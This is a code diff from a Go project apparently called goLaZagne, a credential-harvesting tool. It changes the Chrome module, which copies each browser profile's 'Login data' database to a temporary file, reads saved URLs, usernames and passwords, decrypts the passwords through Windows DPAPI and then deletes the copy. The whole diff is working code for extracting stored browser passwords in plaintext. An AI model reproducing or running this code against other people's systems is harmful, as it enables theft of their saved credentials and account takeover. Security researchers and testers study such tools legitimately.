@@ -6,6 +6,7 @@ import (
 	"github.com/buger/jsonparser"
 	"goLaZagne/common"
 	"io/ioutil"
+	"log"
 	"os"
 )
 
@@ -29,12 +30,14 @@ func ChromeModuleStart(path string) ([]common.UrlNamePass, bool){
 		for i:= range profileNames{
 			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileNames[i])
 			if _, err := os.Stat(dbPath); err == nil {
-				randomDbName := common.RandStringRunes(10)
-				err := common.CopyFile(dbPath, randomDbName)
+				//randomDbName := common.RandStringRunes(10)
+
+				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
+				err := common.CopyFile(dbPath, file.Name())
 				if err != nil{
 					return nil, false
 				}
-				temporaryDbNames = append(temporaryDbNames, randomDbName)
+				temporaryDbNames = append(temporaryDbNames, file.Name())
 			}
 		}
 
@@ -56,6 +59,8 @@ func ChromeModuleStart(path string) ([]common.UrlNamePass, bool){
 				data = append(data, common.UrlNamePass{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
 			}
 
+			os.Remove(temporaryDbNames[dbNum])
+			log.Println("Removing temp db")
 			return data, true
 		}
 	}
